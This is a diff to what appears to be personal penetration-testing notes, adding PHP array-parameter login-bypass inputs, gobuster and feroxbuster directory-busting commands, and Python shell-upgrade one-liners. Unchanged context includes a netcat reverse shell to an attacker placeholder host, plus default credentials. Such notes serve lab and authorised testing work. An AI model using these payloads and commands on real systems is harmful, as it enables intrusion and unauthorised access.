@@ -50,6 +50,20 @@ Manual Enumeration (go to website and click around):
 		- root:toor
 		- username:username ( if you find a username)
 
+### PHP Comparisons and Login Page
+If a page is running PHP and there is some login page, it is worth testing out for PHP Comparisons error. Try all these in the parameters
+
+```bash
+
+`user[]=a&pwd=b` , `user=a&pwd[]=b` , `user[]=a&pwd[]=b`
+
+# the above works because user[] is NULL, pass[] is NULL and thus the whole thing returns true!
+
+/index.php?VALUE[1]=1; //if you put this in the URL PHP will parse this as true!
+
+```
+- also watch for the use of strcmp (which is insecure)
+
 ## Hey It's WordPress!
 
 - Auto Enum:
@@ -82,23 +96,33 @@ see if you can upload files via the media or the plugins tab.
 
 nikto -h <ip> -C all
 
-gobuster dir -u http://<target ip> -w <use the seclists dir list> -t 50 --no-error -x config, txt, pdf
+gobuster -u http://<ip>:<port> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-2.3-medium.txt -t 50 --no-errors
 
-# if https. -k to skip SSL errors
+# for TLS/SSL enabled sites, -k to ignore ssl errors
 
-gobuster dir -u https://<target ip> -w <seclist> -t 50 -k --no-error
+gobuster -u https://<ip>:<port> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-2.3-medium.txt -t 50 --no-error -k
 
-# if page is running things like php or aspx, add -x flag. you an often find things like admin.php
+# after running directory busting, search for common files
 
-gobuster dir -u http://<target ip> -w <use the seclists dir list> -t 50 --no-error -x php, aspx
+gobuster -u http://<ip>:<port> -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -t 50 --no-errors
 
-# also 
+# considering running with file extensions such as -x php, txt, conf, config, pdf, asp, aspx
 
-# if any interesting directories, further gobust those
+--exclude-length
 
-# feroxbuster is pretty cool as well!
+-U <user> -P <password> # for websites with basic auth
 
-feroxbuster -u <target> -x txt,pdf,conf,php,aspx (edit the extensions as needed)
+# feroxbuster can be a decent recursive alternative as well esp for /api
+
+feroxbuster -u <target> -x <extensions> 
+
+--threads 30 --scan-limit 2 ( to throttle the speed)
+
+-d <depth level> # default is 4
+
+-k # ignore SSL/TLS errors
+
+-r # follow redirects
 
 ```
 - if you find any .git folders, download them!
@@ -209,8 +233,11 @@ busybox nc <attacker ip> <port> -e /bin/bash
 - Once you pop your web shell, it is usually a "weak" shell that may have issues executing follow on exploits. if it linux, upgrade your shell first (needs python)
 
 ```bash
+# revshell on a linux box
+which python python3 # check what version of python there is
+
 # change to /bin/sh if it doesnt work
-python3 -c "import pty;pty.spawn('/bin/bash');"
+python -c "import pty;pty.spawn('/bin/bash');"
 
 python3 -c 'import os; os.system("/bin/bash");'
 ```
